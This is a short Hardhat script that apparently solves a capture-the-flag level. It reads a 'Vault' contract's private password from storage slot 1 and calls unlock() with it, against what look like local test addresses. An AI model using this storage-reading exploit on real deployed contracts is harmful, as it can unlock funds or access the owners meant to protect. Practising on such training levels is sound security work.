
const { ethers } = require("hardhat");
async function main () {
  const useraddress = "0x90F79bf6EB2c4f870365E785982E1f101E93b906";
  const instanceaddress = "0xF1823bc4243b40423b8C8c3F6174e687a4C690b8";
  const signer = await ethers.getSigner(useraddress);
  const contract = await ethers.getContractAt(
    "Vault",
    instanceaddress,
    signer
  );

    let key = await ethers.provider.getStorage(instanceaddress, 1);

    console.log(key);

    await contract.unlock(key);

}


main().catch((error) => {
  console.error(error);
  process.exit(1);
})

